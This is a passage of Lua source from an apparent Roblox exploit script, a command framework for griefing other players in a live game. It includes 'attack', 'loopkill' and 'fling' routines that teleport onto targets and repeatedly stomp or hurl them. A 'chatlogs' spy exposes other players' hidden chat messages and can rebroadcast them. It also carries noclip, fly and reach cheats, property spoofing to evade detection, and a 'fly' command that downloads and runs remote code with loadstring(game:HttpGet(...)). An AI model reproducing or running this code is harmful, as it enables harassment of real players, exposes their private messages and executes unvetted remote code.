ExecuteCommand("equipfist", {}, LocalPlayer);

ExecuteCommand("uncircle", {}, LocalPlayer);


if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing2 = true
end
attacking = true
	local Target = GetPlayer(Args[1])[1]
	undergroundtarget = GetPlayer(Args[1])[1]
wait(0.2)
if errored == false then

	local Connection = CConnect(Heartbeat, function()
		GetRoot().CFrame = GetRoot(Target).CFrame * CFrameNew(0, -6, 1);
	end)

	CEnv[Target.Name] = Connection
	AddPlayerConnection(LocalPlayer, Connection);
	AddConnection(Connection);


Players = game:GetService("Players")

IYMouse = Players.LocalPlayer:GetMouse()
UserInputService = game:GetService("UserInputService")
releaseDelay = 1.6
				local mouse = IYMouse
attacks = 0
repeat
wait()
	local localPlayer     = game:GetService("Players").LocalPlayer;
	local localCharacter  = localPlayer.Character;
				localCharacter.Combat:Activate()
wait(1)
attacks = attacks+1
if attacks == 5 then
ExecuteCommand("unattack", {}, LocalPlayer);
if standing2 == true then
ExecuteCommand("summon", {}, LocalPlayer);
end
end
until attacking == false
else
errored = false
end
print("a")
end
else
errored = false
end
end)


AddCommand("chatlogs", {"clogs"}, "enables chatlogs", {}, function(Caller)
--This script reveals ALL hidden messages in the default chat

enabled = true --chat "/spy" to toggle!
spyOnMyself = true --if true will check your messages too
public = false --if true will chat the logs publicly (fun, risky)
publicItalics = true --if true will use /me to stand out
privateProperties = { --customize private logs
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}


local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
end)




AddCommand("unattack", {"unkill"}, "removes loop teleportation to the other character", {}, function(Caller)
if attackinglol == true then
ExecuteCommand("unfloat", {}, LocalPlayer);
if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
end

attackinglol = false
attacking = false
            if attackunder == true then
                attackunder = false
                	local Looping = LoadCommand("underground").CmdEnv;
	if (not next(Looping)) then
	end
	DisableAllCmdConnections("attack");
		plr = game:GetService('Players').LocalPlayer
	X9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z

plr.Character.HumanoidRootPart.CFrame = CFrame.new(X99,Y99+6,Z99)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X99,Y99+6,Z99)
                else
	local Looping = LoadCommand("attack").CmdEnv;
	if (not next(Looping)) then
	end
	DisableAllCmdConnections("attack");
	plr = game:GetService('Players').LocalPlayer
	X9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z9 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z

plr.Character.HumanoidRootPart.CFrame = CFrame.new(X9,Y9+26,Z9)
if standing == true then
a = true 
end
end
end
end)

AddCommand("tweento", {"tweengoto"}, "tweens yourself to the other person", {3, "1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	local TweenService = Services.TweenService
	local Create = TweenService.Create
	for i, v in next, Target do
		local Tween = Create(TweenService, GetRoot(), TweenInfo.new(-1000), {CFrame = GetRoot(v).CFrame})
		Tween.Play(Tween);
	end
end)





AddCommand("fly", {}, "fly your character", {3}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	if flyonce == true then
		loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/b7c482e5595261af3d667f3f673c2620/raw/4b8c78a75f71e19bc2d0547234390fa0b802ebfc/flight"))()
	else
		FLYSPEED = 20
		loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/b7c482e5595261af3d667f3f673c2620/raw/4b8c78a75f71e19bc2d0547234390fa0b802ebfc/flight"))()
	end
end
end)





AddCommand("shazam", {}, "fly your character", {3}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
FLYSPEED = 20

        local player = game.Players.LocalPlayer
        local Flyanimation = Instance.new('Animation', game.Workspace)
        Flyanimation.AnimationId = 'rbxassetid://3541044388'
        local Idleanimation = Instance.new('Animation', game.Workspace)
        Idleanimation.AnimationId = 'rbxassetid://3541114300'
        local HeroIdle = player.Character.Humanoid:LoadAnimation(Idleanimation)
        local HeroFly = player.Character.Humanoid:LoadAnimation(Flyanimation)
        Idleing2 = false
            local function flyanim()
                    --HeroIdle:Stop()
                    local FlyingA = false
                    for i,v in pairs(player.Character.Humanoid:GetPlayingAnimationTracks()) do
                        if v.Animation.AnimationId == 'rbxassetid://3541044388' then
                            FlyingA = true
                        end
                        if v.Animation.AnimationId == 'rbxassetid://2788289281' then
                            v:Stop()
                        end
                        if v.Animation.AnimationId == 'rbxassetid://2788292075' then
                            v:Stop()
                        end
                    end
                    if FlyingA == false and Idleing2 == false then
                        HeroFly:Play()
                    end
            end
        
        local SPEED = FLYSPEED
        repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
        local mouse = game.Players.LocalPlayer:GetMouse()
        repeat wait() until mouse
        local plr = game.Players.LocalPlayer
        local torso = plr.Character.Head
        flying = false
        local deb = true
        local ctrl = {f = 0, b = 0, l = 0, r = 0}
        local lastctrl = {f = 0, b = 0, l = 0, r = 0}
        maxspeed = 5000
        speed = 5001
        function Fly()
            local bg = Instance.new("BodyGyro", torso)
            bg.P = 9e4
            bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
            bg.cframe = torso.CFrame
            local bv = Instance.new("BodyVelocity", torso)
            bv.velocity = Vector3.new(0,0.1,0)
            bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
            repeat wait()
            plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = true
            if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then
                speed = speed+.0+(speed/maxspeed)
                local foundidle = false
                flyanim()
            if speed > maxspeed then
        
                speed = maxspeed
        
            end
            elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then
                speed = speed-5
                
            if speed > 5 then
                speed = -2
            end
            end
            if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then
                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
                lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
            elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then
                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
              
            else
                bv.velocity = Vector3.new(0,0.1,0)
        
        
            end
            bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
            until not flying
            ctrl = {f = 0, b = 0, l = 0, r = 0}
            lastctrl = {f = 0, b = 0, l = 0, r = 0}
            speed = 5
            bg:Destroy()
            bv:Destroy()
            plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = false
        end
        mouse.KeyDown:connect(function(key)
            if key:lower() == "x" then
                if flying then
                    flying = false
                    HeroFly:Stop()
                    HeroIdle:Stop()
            else
                flying = true
                Fly()
            end
        
            elseif key:lower() == "w" then
                ctrl.f = FLYSPEED
            elseif key:lower() == "s" then
                ctrl.b = -FLYSPEED
            elseif key:lower() == "a" then
                ctrl.l = -FLYSPEED
            elseif key:lower() == "d" then
                ctrl.r = FLYSPEED
            end
        end)
        mouse.KeyUp:connect(function(key)
            if key:lower() == "w" then
                ctrl.f = 0
            elseif key:lower() == "s" then
                ctrl.b = 0
            elseif key:lower() == "a" then
                ctrl.l = 0
            elseif key:lower() == "d" then
                ctrl.r = 0
            end
            if ctrl.r == 0 and ctrl.l == 0 and ctrl.b == 0 and ctrl.f == 0 then
                local Loop
                local loopFunction = function()
                    Idleing2 = true
                    HeroFly:Stop()
                    wait()
                    Idleing = false
                    for i,v in pairs(player.Character.Humanoid:GetPlayingAnimationTracks()) do
                        if v.Animation.AnimationId == 'rbxassetid://3541114300' then
                            Idleing = true
                        end
                    end
                    if Idleing == false and flying == true then
                        HeroIdle:Play()
                    end
        
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                    Idleing2 = false
                end;
                Start()	
                repeat wait() until ctrl.r ~= 0 or ctrl.l ~= 0 or ctrl.b ~= 0 or ctrl.f ~= 0 or flying == false
                Pause()
            end
            end)
        Fly()
        player.CharacterAdded:Connect(function()
            repeat wait() until player.Character
            wait(1)
            Fly()
        end)
end
end)



AddCommand("float", {}, "floats your character", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	if (not CEnv[1]) then
		local Part = InstanceNew("Part");
		Part.CFrame = CFrameNew(0, -10000, 0);
		Part.Size = Vector3New(2, .2, 1.5);
		Part.Material = "Grass"
		Part.Anchored = true
		Part.Transparency = 1
		ProtectInstance(Part);
		Part.Parent = Services.Workspace
		CEnv[2] = Part
		local R6 = isR6();
		local Root = GetRoot();
		AddConnection(CConnect(RenderStepped, function()
			if (CEnv[1] and Root) then
				Part.CFrame = Root.CFrame * CFrameNew(0, -3.1, 0);
			else
				Part.CFrame = CFrameNew(0, -10000, 0);
				Root = GetRoot();
			end
			if (Keys["Q"]) then
				Root.CFrame = Root.CFrame * CFrameNew(0, -1.5, 0);
			elseif (Keys["E"]) then
				Root.CFrame = Root.CFrame * CFrameNew(0, 1.5, 0);
			end
		end), CEnv)
	end
end
end)

AddCommand("unfloat", {"nofloat"}, "stops float", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Floating = LoadCommand("float").CmdEnv
	if (Floating[1]) then
		Disconnect(Floating[1]);
		Destroy(Floating[2]);
		LoadCommand("float").CmdEnv = {}
	end
end
end)


AddCommand("flyspeed", {}, "sets your fly speed", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local spedAmount = tonumber(Args[1]) or 70
	FLYSPEED = spedAmount
end
end)

AddCommand("fov", {}, "sets your fov", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Amount = tonumber(Args[1]) or 70
	SpoofProperty(Camera, "FieldOfView");
	Camera.FieldOfView = Amount
end
end)

AddCommand("forceresetp", {"frp"}, "sets your fov", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
local L_1_ = "p"
local L_2_ = game.Players.LocalPlayer:GetMouse()
L_2_.KeyDown:Connect(
    function(L_22_arg0)
	if L_22_arg0 == L_1_ then
    for i, v in pairs(LocalPlayer.Character:GetChildren()) do
        if v:IsA("BasePart") or v:IsA("Part") or v:IsA("MeshPart") then
            if v.Name ~= "HumanoidRootPart" then
                v:Destroy()
            end
        end
    end
end
end
)
end
end)
cashaura1 = false
AddCommand("cashaura", {"autopick"}, "automatically picks up cash around your", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
            if cashaura1 == false then
                cashaura1 = true
                        Notify({ 
Description = "toggled on";
Title = "cashaura";
Duration = 2;
});
                repeat
wait(0.2)
player = game.Players.LocalPlayer
  local Character = player.Character
    local Humanoid = Character:FindFirstChildWhichIsA('Humanoid')

                for i,v in pairs(game:GetService('Workspace')['Ignored']['Drop']:GetChildren()) do
                    if v:IsA('Part') then
                        if (v.Position - player.Character.HumanoidRootPart.Position).Magnitude <= 12 then
                            fireclickdetector(v:FindFirstChild('ClickDetector'))
                        end
                    end
                end
                until cashaura1 == false
                else
                    cashaura1 = false
                            Notify({ 
Description = "toggled off";
Title = "cashaura";
Duration = 2;
});
                end
end
end)

autodrop = false
AddCommand("autodrop", {"fastdrop"}, "automatically drops cash", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = false
        else
if autodrop == false then
autodrop = true
        Notify({ 
Description = "toggled on";
Title = "autodrop";
Duration = 2;
});
	repeat
	game.ReplicatedStorage.MainEvent:FireServer("DropMoney", 10000)
                wait(1)
	until autodrop == false
else
if autodrop == true then
autodrop = false
        Notify({ 
Description = "toggled off";
Title = "autodrop";
Duration = 2;
});
end
end
end
end)


AddCommand("fling", {"stan"}, "flings a player", {"1"}, function(Caller, Args)
wait(0.5)
if errored ~= true then
flying = false
                        game.ReplicatedStorage.MainEvent:FireServer("Block",true)


if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing2 = true
end


    local Target = GetPlayer(Args[1]);
    local Root = GetRoot()
    local OldPos, OldVelocity = Root.CFrame, Root.Velocity

    for i, v in next, Target do
        local TargetRoot = GetRoot(v);
        local TargetPos = TargetRoot.Position
        local Running = CConnect(Stepped, function(step)
            step = step - Services.Workspace.DistributedGameTime

            Root.CFrame = (TargetRoot.CFrame - (Vector3New(0, 1e6, 0) * step)) + (TargetRoot.Velocity * (step * 30))
            Root.Velocity = Vector3New(0, 1e6, 0)
        end)
        local starttime = tick();
        repeat
            wait();
        until (TargetPos - TargetRoot.Position).magnitude >= 60 or tick() - starttime >= 3.5
        Disconnect(Running);
    end
    wait();
    local Running = CConnect(Stepped, function()
        Root.Velocity = OldVelocity
        Root.CFrame = OldPos
    Root.CFrame = OldPos
    Root.CFrame = OldPos
    end)
    wait(2);
    Root.CFrame = OldPos
    Root.CFrame = OldPos
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
    Root.Velocity = OldVelocity
    Root.CFrame = OldPos
	plr = game:GetService('Players').LocalPlayer
	X11 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y11 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z11 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
wait(0.2)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11-3,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11-3,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
        Disconnect(Running);
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11-3,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11-3,Z11)
plr.Character.HumanoidRootPart.CFrame = CFrame.new(X11,Y11+5,Z11)
if standing2 == true then
ExecuteCommand("summon", {}, LocalPlayer);
end
errored = false
end
end)


AddCommand("noclip", {}, "noclips your character", {3}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Char = GetCharacter()
	local Noclipping = AddConnection(CConnect(Stepped, function()
		for i, v in next, GetChildren(Char) do
			if (IsA(v, "BasePart") and v.CanCollide) then
				SpoofProperty(v, "CanCollide");
				v.CanCollide = false
			end
		end
	end), CEnv);
	local Torso = isR6() and Char.Torso or Char.UpperTorso
	local Noclipping2 = AddConnection(CConnect(Torso.Touched, function(Part)
		if (Part and Part.CanCollide and not FindFirstChildWhichIsA(Part.Parent, "Humanoid")) then
			local OldTransparency = Part.Transparency
			Part.CanCollide = false
			Part.Transparency = Part.Transparency <= 0.5 and 0.6 or Part.Transparency
			wait(2);
			Part.CanCollide = true
			Part.Transparency = OldTransparency
		end
	end), CEnv);
	Utils.Notify(Caller, "Command", "noclip enabled");
	CWait(GetHumanoid().Died);
	DisableAllCmdConnections("noclip");
end
end)

AddCommand("clip", {"unnoclip"}, "disables noclip", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	if (not next(LoadCommand("noclip").CmdEnv)) then
        Notify({ 
Description = "ur not in noclip, idiot";
Title = "warning";
Duration = 2;
});
	else
		DisableAllCmdConnections("noclip");
	end
end
end)
standing = false

callme = "sir"

AddCommand("whatsmyname", {"myname"}, "fixes fling cmd", {}, function(Caller)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i am calling you by: "..callme.." ","All")
end)


AddCommand("summon", {}, "fixes fling cmd", {}, function(Caller)
if standing == false then
standing = true
standing = true
flying = true
ExecuteCommand("stand", {hostusername}, LocalPlayer);
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im here, "..callme ,"All")
end
end)


AddCommand("callme", {}, "fixes fling cmd", {"1"}, function(Caller, Args)
callme = (Args[1])
end)



AddCommand("newhost", {}, "fixes fling cmd", {"1"}, function(Caller, Args)
getuser = (Args[1])
Players = game:GetService('Players')
        for i,v in pairs(game.Players:GetChildren()) do
            if (string.sub(string.lower(v.Name),1,string.len(getuser))) == string.lower(getuser) then
target = v.Name
            end
        end
hostusername = target

        Notify({ 
Description = "newhost "..hostusername;
Title = "host";
Duration = 2;
});
end)

AddCommand("unsummon", {}, "fixes fling cmd", {}, function(Caller)
if standing == true then
ExecuteCommand("unstand", {}, LocalPlayer);
standing = false 
end
end)










AddCommand("targetgui", {"targetui"}, "fixes fling cmd", {}, function(Caller)




local ScreenGui = Instance.new("ScreenGui")
local targetgui = Instance.new("Frame")
local title = Instance.new("TextLabel")
local close = Instance.new("TextButton")
local fling = Instance.new("TextButton")
local loopkill = Instance.new("TextButton")
local TargetTextbox = Instance.new("TextBox")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

targetgui.Name = "targetgui"
targetgui.Parent = ScreenGui
targetgui.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
targetgui.BorderColor3 = Color3.fromRGB(60, 60, 60)
targetgui.Position = UDim2.new(0.437999994, 0, 0.135483876, 0)
targetgui.Size = UDim2.new(0, 112, 0, 219)

title.Name = "title"
title.Parent = targetgui
title.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
title.BorderColor3 = Color3.fromRGB(60, 60, 60)
title.Size = UDim2.new(0, 72, 0, 28)
title.Font = Enum.Font.SourceSans
title.Text = "Target gui"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 20.000

close.Name = "close"
close.Parent = targetgui
close.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
close.BorderColor3 = Color3.fromRGB(255, 255, 255)
close.Position = UDim2.new(0.642857134, 0, 0, 0)
close.Size = UDim2.new(0, 40, 0, 28)
close.Font = Enum.Font.SourceSans
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 0, 4)
close.TextSize = 30.000

fling.Name = "fling"
fling.Parent = targetgui
fling.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
fling.BorderColor3 = Color3.fromRGB(255, 255, 255)
fling.Position = UDim2.new(0, 0, 0.342465758, 0)
fling.Size = UDim2.new(0, 112, 0, 28)
fling.Font = Enum.Font.SourceSans
fling.Text = "fling"
fling.TextColor3 = Color3.fromRGB(255, 255, 255)
fling.TextSize = 30.000

loopkill.Name = "loopkill"
loopkill.Parent = targetgui
loopkill.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
loopkill.BorderColor3 = Color3.fromRGB(255, 255, 255)
loopkill.Position = UDim2.new(0, 0, 0.470319629, 0)
loopkill.Size = UDim2.new(0, 112, 0, 28)
loopkill.Font = Enum.Font.SourceSans
loopkill.Text = "loopkill"
loopkill.TextColor3 = Color3.fromRGB(255, 0, 4)
loopkill.TextSize = 30.000

TargetTextbox.Name = "TargetTextbox"
TargetTextbox.Parent = targetgui
TargetTextbox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
TargetTextbox.BorderColor3 = Color3.fromRGB(60, 60, 60)
TargetTextbox.Position = UDim2.new(0, 0, 0.127853885, 0)
TargetTextbox.Size = UDim2.new(0, 112, 0, 47)
TargetTextbox.Font = Enum.Font.SourceSans
TargetTextbox.Text = "user"
TargetTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
TargetTextbox.TextSize = 16.000


targetgui.Active = true
targetgui.Draggable = true

Players = game:GetService('Players')
UIS = game:GetService('UserInputService')
RS = game:GetService('RunService')



function SetPlayerInfo()
	local foundplayer = game:GetService('Players'):FindFirstChild(TargetTextbox.Text)
	if foundplayer then
print("found player")
	end
end


function ShrinkName()
	TargetTextbox.FocusLost:connect(function()
		for i,v in pairs(game.Players:GetChildren()) do
			if (string.sub(string.lower(v.Name),1,string.len(TargetTextbox.Text))) == string.lower(TargetTextbox.Text) then
				TargetTextbox.Text = v.Name
				SetPlayerInfo()
			end
		end
	end)
end
ShrinkName()

loopkilling = false

function gotokill()
 local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = TargetTextbox.Text
p1.CFrame = game.Players[p2].Character.LowerTorso.CFrame
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
game.ReplicatedStorage.MainEvent:FireServer("Stomp")

end

local function PENE_fake_script() -- fling.LocalScript 
	local script = Instance.new('LocalScript', fling)

	script.Parent.MouseButton1Click:Connect(function()
		ExecuteCommand("fling", {TargetTextbox.Text}, LocalPlayer);	
	end)
end
coroutine.wrap(PENE_fake_script)()
local function VPITNRN_fake_script() -- loopkill.LocalScript 
	local script = Instance.new('LocalScript', loopkill)

	script.Parent.MouseButton1Click:Connect(function()

   local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
 
local localPlayer = Players.LocalPlayer

			if localPlayer.Character then 
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then 
					humanoid:UnequipTools()
end
end
ExecuteCommand("equipfist", {}, LocalPlayer);
--loopkill
if loopkilling == false then
    loopkilling = true
    loopkill.TextColor3 = Color3.fromRGB(1, 255, 1)
  
repeat
    wait()
attackfinished = false
ExecuteCommand("attack", {TargetTextbox.Text}, LocalPlayer);
wait(0.9)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)
gotokill()
wait(0.1)

game.ReplicatedStorage.MainEvent:FireServer("Stomp")

game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
gotokill()
wait(0.1)
gotokill()
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")
wait(0.1)
game.ReplicatedStorage.MainEvent:FireServer("Stomp")

until loopkilling == false
  
    
    else
        loopkill.TextColor3 = Color3.fromRGB(255, 1, 1)
    loopkilling = false
    
    end
	
	end)
end
coroutine.wrap(VPITNRN_fake_script)()



end)

AddCommand("findplr", {"finduser"}, "teleports yourself to the other character", {3, "1"}, function(Caller, Args)
	local Amount = GetPlayer(Args[1])
    for i, v in next, Amount do
Amount = (v)
print(Amount)
end
end)






AddCommand("fixfling", {"flingfix"}, "fixes fling cmd", {}, function(Caller)
flingcooldown = false
        Notify({ 
Description = "if it doesnt work, try again in 10 seconds";
Title = "fix";
Duration = 2;
});
end)

stompauto = false
AddCommand("autostomp", {}, "fixes fling cmd", {}, function(Caller)
if stompauto == false then
stompauto = true
        Notify({ 
Description = "on";
Title = "autostomp";
Duration = 2;
});
repeat
wait()
			game.ReplicatedStorage.MainEvent:FireServer("Stomp")
until stompauto == false
else
stompauto = false
        Notify({ 
Description = "off";
Title = "autostomp";
Duration = 2;
});
end
end)

AddCommand("fistreach", {"fistreachh"}, "fixes fling cmd", {}, function(Caller)
        Notify({ 
Description = "cannot toggle";
Title = "fix";
Duration = 2;
});
	repeat
                wait()
                    local success, err = pcall(function()
                    if player.Character.BodyEffects.Attacking.Value == true then
                        for i,v in pairs(game:GetService('Players'):GetChildren()) do
                            if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                    if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                        firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                                    else
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                                    end
                                end
                            end
                        end
                    end
                end)
	until autodrop1 == false
end)


AddCommand("puppyware", {"pupware"}, "fixes fling cmd", {}, function(Caller)

--[[

if getgenv().PuppywareSettings == nil then

    print("Cannot find your configuration.")

    getgenv().PuppywareSettings = {
        PerformanceMode = true,
        turksense = false,
        TargetKey = "E"
    }

end

wait(0.5)

]]



getgenv().PuppywareSettings = {
    PerformanceMode = true,
    turksense = false,
